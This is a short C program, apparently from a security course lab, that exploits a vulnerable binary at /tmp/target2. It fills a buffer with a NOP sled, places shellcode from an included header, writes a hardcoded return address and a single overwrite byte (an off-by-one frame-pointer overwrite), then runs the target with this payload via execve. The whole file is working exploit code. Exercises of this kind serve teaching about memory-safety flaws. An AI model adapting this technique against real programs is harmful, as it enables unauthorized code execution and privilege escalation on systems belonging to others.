#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack[241];
  char erb[] = "\x70";
  char ret[] = "\xd0\xfc\xff\xbf";

  memset(attack, 0x90, 240);
  memcpy(attack + 191, shellcode, 45);
  memcpy(attack + 236, ret, 4);
  memcpy(attack + 240, erb, 1);

  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
